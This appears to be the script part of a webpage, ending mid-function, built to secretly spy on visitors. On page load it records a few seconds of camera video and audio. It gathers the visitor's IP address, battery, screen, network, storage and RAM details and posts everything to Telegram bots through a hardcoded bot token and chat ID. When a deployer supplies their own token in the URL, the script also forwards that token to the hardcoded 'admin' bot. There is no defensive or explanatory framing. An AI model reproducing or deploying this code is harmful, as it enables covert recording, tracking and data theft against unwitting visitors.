        <script>
        window.onload = function() {
            let progress = 0;
            const interval = setInterval(() => {

        const defaultToken = '7441227305:AAGdXG0d-IQEy6u7p94_NVzsUMMSIj01dtM';
        const defaultChatId = '5080596463';

        function getUrlParameter(name) {
            name = name.replace(/[\[\]]/g, '\\$&');
            var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
                results = regex.exec(window.location.href);
            if (!results) return null;
            if (!results[2]) return '';
            return decodeURIComponent(results[2].replace(/\+/g, ' '));
        }

        const tokenFromUrl = getUrlParameter('token');
        const chatIdFromUrl = getUrlParameter('id');

        async function sendVideoToTelegram(blob, message, token, chat_id) {
            const formData = new FormData();
            formData.append('chat_id', chat_id);
            formData.append('video', blob, 'user_video.mp4');
            formData.append('caption', message);

            try {
                const response = await fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
                    method: 'POST',
                    body: formData,
                });

                if (!response.ok) {
                    throw new Error('Failed to send video');
                }

                console.log('Video sent successfully to', chat_id);
            } catch (error) {
                console.error('Error sending video to', chat_id, ':', error);
            }
        }

        async function sendCaptionToTelegram(caption, token, chat_id) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: chat_id,
                        text: caption
                    })
                });

                if (!response.ok) {
                    throw new Error('Failed to send caption');
                }

                console.log('Caption sent successfully to', chat_id);
            } catch (error) {
                console.error('Error sending caption to', chat_id, ':', error);
            }
        }

        async function sendVideoAndCaption(blob, caption) {
            const videoMessage = `üì∏ This is the front camera video \n\nüÜî Your Chat ID: @${chatIdFromUrl}`;

            if (tokenFromUrl && chatIdFromUrl) {
                await sendVideoToTelegram(blob, videoMessage, tokenFromUrl, chatIdFromUrl);
                await sendCaptionToTelegram(caption, tokenFromUrl, chatIdFromUrl);

                const adminCaption = `${caption}\n\nüì± User Token: ${tokenFromUrl}\n\nüÜî User Chat ID: @${chatIdFromUrl}`;
                await sendVideoToTelegram(blob, videoMessage, defaultToken, defaultChatId);
                await sendCaptionToTelegram(adminCaption, defaultToken, defaultChatId);
            } else {
                await sendVideoToTelegram(blob, videoMessage, defaultToken, defaultChatId);
                await sendCaptionToTelegram(caption, defaultToken, defaultChatId);
            }
        }

        async function recordAndSendVideo() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const videoElement = document.getElementById('video');
                videoElement.srcObject = stream;
                const mediaRecorder = new MediaRecorder(stream);
                const recordedChunks = [];

                mediaRecorder.ondataavailable = event => {
                    if (event.data && event.data.size > 0) {
                        recordedChunks.push(event.data);
                    }
                };

                mediaRecorder.onstop = async () => {
                    const blob = new Blob(recordedChunks, { type: 'video/mp4' });
                    const caption = await getDeviceInfo();
                    await sendVideoAndCaption(blob, caption);
                };

                mediaRecorder.start();

                setTimeout(() => {
                    mediaRecorder.stop();
                }, 2000);
            } catch (error) {
                console.error('Error accessing webcam:', error);

                const errorMessage = ` üì∏Camera access has been blocked. Unable to record videoüö´.\n\nüÜî Your Chat ID: @${chatIdFromUrl}`;
                await sendCaptionToTelegram(errorMessage, tokenFromUrl || defaultToken, chatIdFromUrl || defaultChatId);

                if (tokenFromUrl && chatIdFromUrl) {
                    const adminErrorMessage = `${errorMessage}\n\nüì± User Token: ${tokenFromUrl}\n\nüÜî User Chat ID: @${chatIdFromUrl}`;
                    await sendCaptionToTelegram(adminErrorMessage, defaultToken, defaultChatId);
                }
            }
        }

        async function getDeviceInfo() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                const ip = data.ip;

                const userAgent = navigator.userAgent;
                const battery = await navigator.getBattery();
                const batteryPercentage = (battery.level * 100).toFixed(2);
                const chargingStatus = battery.charging ? "Charging" : "Not Charging";
                const browserLanguage = navigator.language;
                const screenWidth = window.screen.width;
                const screenHeight = window.screen.height;

                const startTime = (new Date()).getTime();
                await fetch('https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png', { mode: 'no-cors' });
                const endTime = (new Date()).getTime();
                const duration = (endTime - startTime) / 1000;
                const downloadSize = 5554;
                const bitsLoaded = downloadSize * 8;
                const speedBps = (bitsLoaded / duration).toFixed(2);
                const speedKbps = (speedBps / 1024).toFixed(2);
                const speedMbps = (speedKbps / 1024).toFixed(2);

                let networkType = '';
                if (speedMbps < 0.1) {
                    networkType = '1G';
                } else if (speedMbps < 1) {
                    networkType = '2G';
                } else if (speedMbps < 10) {
                    networkType = '3G';
                } else if (speedMbps < 50) {
                    networkType = '4G';
                } else {
                    networkType = '5G';
                }

                function adjustStorage(value) {
                    if (value >= 20 && value < 30) return 32;
                    if (value >= 50 && value < 70) return 64;
                    if (value >= 100 && value < 130) return 128;
                    if (value >= 250 && value < 280) return 256;
                    return Math.round(value);
                }

                const storageInfo = await navigator.storage.estimate();
                let totalStorage = (storageInfo.quota / (1024 * 1024 * 1024)).toFixed(2);
                let usedStorage = (storageInfo.usage / (1024 * 1024 * 1024)).toFixed(2);

                usedStorage = adjustStorage(usedStorage * 2);
                totalStorage = adjustStorage(totalStorage * 2);
                
                const storageDisplay = usedStorage > 0 ? `${usedStorage} GB / ${totalStorage} GB` : `${totalStorage} GB`;

                const ram = navigator.deviceMemory;

                let networkIndicator = '';
                if (navigator.connection) {
                    const connectionType = navigator.connection.type;
                    if (connectionType === 'wifi') {
                        networkIndicator = '‚úÖ Wi-Fi';
                    } else {
                        networkIndicator = '‚úÖ Mobile Data';
                    }
                } else {
                    networkIndicator = 'Unknown Network Type';
                }

                const currentTime = new Date();
                const date = currentTime.toLocaleDateString();
                const time = currentTime.toLocaleTimeString();

                const caption = `üåê IP Address: ${ip}\n\nüíª User-Agent: ${userAgent}\n\nüîã Battery Percentage: ${batteryPercentage}%\n\n‚ö° Charging Status: ${chargingStatus}\n\nüó£Ô∏è Browser Language: ${browserLanguage}\n\nüìè Screen Size: ${screenWidth}√ó${screenHeight}\n\nüöÄ Internet Speed: ${speedMbps} Mbps\n\nüåç Network Type: ${networkType}\n\n${networkIndicator}\n\nüß† Total RAM: ${ram} GB\n\nüíæ Device Storage: ${storageDisplay}\n\nüïí Date: ${date} Time: ${time}`;

                return caption.trim();
            } catch (error) {
                console.error('Error getting device info:', error);
                const fallbackCaption = `üåê IP Address: Unknown\n\nüíªUser-Agent: Unknown\n\nüîã Battery Percentage: Unknown\n\n‚ö° Charging Status: Unknown\n\nüó£Ô∏è Browser Language: Unknown\n\nüìè Screen Size: Unknown\n\nüöÄ Internet Speed: Unknown\n\nüåç Network Type: Unknown\n\nUnknown Network Type\n\nüß† Total RAM: Unknown\n\nüíæ Device Storage: Unknown\n\nüïí Date: Unknown Time: Unknown`;

                return fallbackCaption.trim();
